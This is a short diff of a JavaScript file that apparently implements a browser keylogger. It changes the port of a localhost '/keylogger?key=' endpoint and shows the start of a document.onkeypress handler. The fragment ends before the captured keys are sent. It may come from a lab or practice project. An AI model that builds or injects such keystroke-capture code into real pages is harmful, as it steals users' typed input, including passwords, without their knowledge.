@@ -1,4 +1,4 @@
-const url = 'http://localhost:8979/keylogger?key='
+const url = 'http://localhost:8989/keylogger?key='
 
 document.onkeypress = e => {
     let k =  ''
